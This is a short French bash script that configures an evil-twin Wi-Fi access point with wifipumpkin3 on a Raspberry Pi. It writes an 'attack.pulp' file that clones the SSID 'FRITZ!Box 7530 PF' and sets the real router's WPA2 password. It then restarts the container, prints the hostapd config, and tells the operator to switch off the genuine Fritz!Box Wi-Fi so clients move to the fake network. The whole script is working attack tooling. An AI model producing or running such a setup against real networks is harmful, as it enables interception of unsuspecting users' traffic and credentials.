#!/bin/bash
# Active le WPA2 sur le fake AP avec le vrai mot de passe de la Fritz!Box
# Usage: bash enable_wpa2.sh <mot_de_passe_wifi>

if [ -z "$1" ]; then
    echo "Usage: bash enable_wpa2.sh <mot_de_passe_wifi>"
    echo "Exemple: bash enable_wpa2.sh MonMotDePasse123"
    exit 1
fi

WIFI_PASS="$1"

if [ ${#WIFI_PASS} -lt 8 ]; then
    echo "[!] Le mot de passe WPA2 doit faire au moins 8 caractères"
    exit 1
fi

echo "[*] Configuration du fake AP avec WPA2..."

# Générer le fichier pulp avec WPA2
cat <<PULP > /home/pi/cia/attack.pulp
set interface wlan1
set ssid FRITZ!Box 7530 PF
set security true
set wpa_type 2
set wpa_algorithms CCMP
set wpa_sharedkey $WIFI_PASS
set proxy noproxy
start
PULP

echo "[+] attack.pulp mis à jour avec WPA2 (CCMP)"

# Redémarrer le container pour appliquer
echo "[*] Redémarrage de wifipumpkin3..."
docker compose -f /home/pi/cia/docker-compose.yml restart

sleep 10

# Vérifier que hostapd a bien le WPA2
echo "[*] Vérification hostapd..."
docker exec wifipumpkin3 cat /root/.config/wifipumpkin3/config/hostapd/hostapd.conf

echo ""
echo "[+] Fake AP configuré :"
echo "    SSID: FRITZ!Box 7530 PF"
echo "    Sécurité: WPA2-PSK (CCMP)"
echo "    Mot de passe: $WIFI_PASS"
echo ""
echo "[*] Prochaine étape : désactiver le Wi-Fi de la Fritz!Box"
echo "    → http://192.168.178.1 → Wi-Fi → Désactiver"
